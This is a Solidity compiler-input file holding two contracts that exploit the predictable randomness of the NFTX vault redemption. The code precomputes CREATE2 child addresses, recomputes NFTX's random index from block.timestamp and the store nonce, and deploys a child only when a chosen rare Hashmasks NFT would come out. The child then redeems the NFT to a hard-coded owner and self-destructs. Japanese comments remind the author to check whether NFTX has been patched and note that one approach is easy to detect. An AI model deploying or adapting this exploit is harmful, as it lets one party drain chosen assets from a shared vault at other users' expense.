{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"browser/Gacha.sol":{"content":"// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.1;\n\ninterface IXStore {\n    function holdingsAt(uint256 vaultId, uint256 index) external view returns (uint256);\n    function reservesLength(uint256 vaultId) external view returns (uint256);\n    function randNonce() external view returns (uint256);\n}\n\ninterface INFTX {\n    function redeem(uint256 vaultId, uint256 numNFTs) external payable;\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    function name() external view returns (string memory);\n    function decimals() external view returns (uint8);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ninterface IERC721{\n    function transferFrom(address from, address to, uint256 tokenId) external;\n}\n\n// まずNFTXがアップデートされてないか確認！！！！！\ncontract GachaChild2 {\n    address constant nftxAddress = 0xAf93fCce0548D3124A5fC3045adAf1ddE4e8Bf7e;\n    INFTX constant nftx = INFTX(nftxAddress); //プロキシコントラクト　TODO\n    IERC20 constant mask = IERC20(0x0fe629d1E84E171f8fF0C1Ded2Cc2221Caa48a3f);\n    IERC721 constant hashmasks = IERC721(0xC2C747E0F7004F9E8817Db2ca4997657a7746928);\n    uint constant e18 = 10 ** 18;\n    \n    function getToken2(uint nftID, address to) public{\n        mask.approve(nftxAddress, e18);\n        nftx.redeem(20, 1);\n        hashmasks.transferFrom(address(this), to, nftID);\n        \n        selfdestruct(payable(to));\n        \n        // redeem -> claim -> mintをoneTXでやる←バレやすい \n    }\n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes memory\n    ) public virtual returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n}\n"},"browser/NTFX.sol":{"content":"// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.1;\n\nimport './Gacha.sol';\n\ncontract NFTX {\n    IXStore constant store = IXStore(0xBe54738723cea167a76ad5421b50cAa49692E7B7);\n    IERC20 constant mask = IERC20(0x0fe629d1E84E171f8fF0C1Ded2Cc2221Caa48a3f);\n    uint constant e18 = 10 ** 18;\n    mapping(uint => bool) private list;\n    address constant owner = 0xd8a693BFA2082640f1926EAE43fCB1e1a799e407;\n    \n    modifier onlyOwner(){\n        require(msg.sender == owner);\n        _;\n    }\n    \n    constructor(){\n        list[3644] = true;\n        list[14055] = true;\n        list[9635] = true;\n        list[11285] = true;\n    }\n    \n    function updateList2(uint[] memory _target) public onlyOwner{\n        for(uint i = 0; i < _target.length; i++){\n            list[_target[i]] = true;\n        }\n    }\n    \n    function findNFT2() public {\n        uint nonce = store.randNonce() + 1;\n        uint modulus = store.reservesLength(20);\n        bytes32 salt;\n        address predictedAddress;\n        uint rand;\n        uint nftID;\n        \n        for(uint saltUint = 0; saltUint < 150; saltUint++){\n            salt = keccak256(abi.encode(saltUint));\n            \n            predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(\n                bytes1(0xff),\n                address(this),\n                salt,\n                keccak256(abi.encodePacked(\n                    type(GachaChild2).creationCode\n                ))\n            )))));\n    \n            \n            rand = uint256(keccak256(abi.encodePacked(block.timestamp, predictedAddress, nonce))) % modulus;\n            nftID = store.holdingsAt(20, rand);\n            \n            if(list[nftID]){\n                GachaChild2 child = new GachaChild2{salt: salt}();\n                mask.transferFrom(msg.sender, address(child), e18);\n                child.getToken2(nftID, owner);\n                return;\n            }\n        }\n    }\n}\n"}}}